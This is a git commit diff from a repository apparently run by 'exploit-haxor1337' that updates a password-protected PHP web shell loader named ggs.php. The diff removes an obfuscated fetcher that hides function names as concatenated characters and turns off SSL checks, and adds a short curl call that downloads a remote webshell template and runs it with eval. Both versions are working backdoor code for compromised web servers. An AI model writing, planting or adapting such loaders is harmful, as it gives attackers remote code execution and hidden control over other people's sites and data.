3390753659ad00a2664054773ec90b75d61b6296
exploit-haxor1337 <76028485+exploit-haxor@users.noreply.github.com>
2024-10-13 23:35:09 +0700

    Update ganteng.php

--- ggs.php
+++ ggs.php
@@ -1,4 +1,3 @@
-
 <?php
 password_verify untuk keamanan yang lebih baik gantenggantengheker
 $hashed_password = '$2y$10$6ujs6prTrAaDbZ5QuGtztetA99UFOzRNrFURr1acgQsMB5kgHezfq';
@@ -24,37 +23,9 @@ if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])])) {
 }
 
 $head = '<head><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="robots" content="noindex"><title>Dashboard</title><style>pre{border:1px solid #ddd;padding:5px;overflow:auto}table{border-collapse:collapse;width:100%;overflow:auto}th,td{padding:0.25rem;text-align:left;border-bottom:1px solid #ccc}tbody tr:nth-child(odd){background:#eee}tr:hover{background-color:#f5f5f5}</style></head>';
-
-
-    function geturlsinfo($url)
-    {
-      $fpn = "f"."o"."p"."e"."n";
-      $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-      $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
-      $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
-        if (function_exists($cexec)) {
-            $conn = curl_init($url);
-            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
-            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
-            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
-            $urls = $cexec($conn);
-            curl_close($conn);
-        } elseif (function_exists($fgt)) {
-            $urls = $fgt($url);
-        } elseif (function_exists($fpn) && function_exists($strim)) {
-            $handle = $fpn($url, "r");
-            $urls = $strim($handle);
-            fclose($handle);
-        } else {
-            $urls = false;
-        }
-        return $urls;
-    }
-
-    $a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php');
-    eval('?>' . $a);
-
+$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/template.php";
+$ch = curl_init($url); 
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($ch);
+eval("?>".$result);
 ?>
